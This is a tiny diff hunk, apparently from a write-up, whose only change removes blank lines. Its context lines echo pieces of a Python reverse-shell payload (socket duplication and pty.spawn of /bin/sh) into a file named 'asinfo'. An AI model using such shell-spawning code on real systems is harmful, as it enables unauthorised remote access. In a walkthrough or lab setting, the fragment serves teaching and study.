@@ -30,5 +30,3 @@
   echo "os.dup2(s.fileno(),2)" >> asinfo
   echo 'pty.spawn("/bin/sh")' >> asinfo
   ```
-
-  
